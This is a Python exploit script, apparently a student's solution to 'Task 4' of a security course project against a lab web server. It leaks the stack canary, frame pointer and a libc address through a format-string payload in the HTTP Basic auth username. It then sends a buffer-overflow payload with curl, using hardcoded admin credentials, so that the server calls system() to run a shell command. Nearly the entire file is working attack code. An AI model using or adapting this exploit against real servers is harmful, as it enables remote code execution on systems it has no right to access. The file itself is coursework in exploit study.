import requests
import re
import binascii
import subprocess

def calculate_offsets(given_address, address_list):
    offsets = {}
    for index, address in enumerate(address_list):
        offset = int(given_address, 16) - int(address, 16)
        offsets[index] = offset
    return offsets

def change_endian(input):
    """
    Convert a hex address to little endian
    """
    ret_string = bytearray.fromhex(input)
    ret_string.reverse()
    ret_string = ''.join(format(x, '02x') for x in ret_string)

    return ret_string.upper()

# url = 'http://127.0.0.1:8080/'  # Replace with your API URL
url = 'http://project-2.csec.chatzi.org:8000/'

auth_string = '%08x ' * 31 + ':'
auth = (auth_string, '') 

response = requests.head(url, auth=auth)

response = response.headers
address_string = re.search(r'Basic realm="Invalid user: (.*?) "', response['WWW-Authenticate']).group(1)
addresses = address_string.split()

canary = addresses[26]
ebp = addresses[29]
return_address = addresses[30]
system_ref = int(addresses[23],16)
system_address = system_ref - 1746336
system_address = hex(system_address).replace('0x','')

buffer_offset = -120
ebp_dec = int(ebp, 16)
buffer_address_dec = ebp_dec + buffer_offset
buffer_address = hex(buffer_address_dec).replace('0x','')

param_address = buffer_address_dec + 88
param_address = hex(param_address).replace('0x','')

# print("buffer address (post_data) : " + buffer_address)
# print("system address : " + system_address)
# print()

param = "lspci".encode("utf-8").hex().replace('0x','')

payload_hex = 'A'*104
payload_hex += change_endian(buffer_address)
payload_hex += 'A'*8
payload_hex += change_endian(canary)
payload_hex += 'A'*16 
payload_hex += change_endian(ebp)
payload_hex += change_endian(system_address)
payload_hex += 'A'*8
payload_hex += change_endian(param_address)
payload_hex += param
payload_hex += '26'

def convert_zeros(string):
    return string.replace('00', '26')

payload_hex = convert_zeros(payload_hex)

def hex_to_binary(hex_string):
    binary_txt = binascii.unhexlify(hex_string)
    with open("my_bin2", "wb") as f:
        f.write(binary_txt)

hex_to_binary(payload_hex)
curl = "curl -m 3 -s -X POST http://project-2.csec.chatzi.org:8000/ -H 'Content-Length: 0' -u admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96 --data-binary '@my_bin2'"
# curl = "curl -m 3 -s -X POST http://127.0.0.1:8080/ -H 'Content-Length: 0' -u test:029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57 --data-binary '@my_bin2'"

output = subprocess.getstatusoutput(curl)

print("\n\n\n============================================== TASK 4 ==============================================\n\n")
print(output)
print("\n\n")

# given_address = input("Enter the given address: ")
# offsets = calculate_offsets(given_address, addresses)

# # Write offsets to a file in append mode
# with open("Task4/offsets.txt", "a") as file:
#     file.write(f"Offsets for {given_address}:\n")
#     for index, offset in offsets.items():
#         file.write(f"Index {index}: Offset = {offset} and address {addresses[index]}\n")